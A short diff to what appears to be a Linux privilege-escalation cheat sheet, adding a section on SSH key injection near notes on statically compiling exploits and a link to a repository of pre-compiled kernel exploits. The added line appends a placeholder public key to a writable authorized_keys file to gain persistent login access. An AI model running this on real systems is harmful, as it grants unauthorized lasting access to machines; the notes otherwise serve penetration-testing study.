@@ -185,6 +185,12 @@ gcc 3.c -o 3 -static -Wl,--hash-style=sysv -m32
 ```
 Only need static if there is a CRuntime Libc2.7 error
 
+## SSH Key Injection
+Try and add a key to a writeable authorized key file
+```bash
+echo "SSH_PUBLIC_KEY" >> /path/to/.ssh/authorized_keys
+```
+
 ## Pre-Compiles Exploits
 https://github.com/SecWiki/linux-kernel-exploits
 
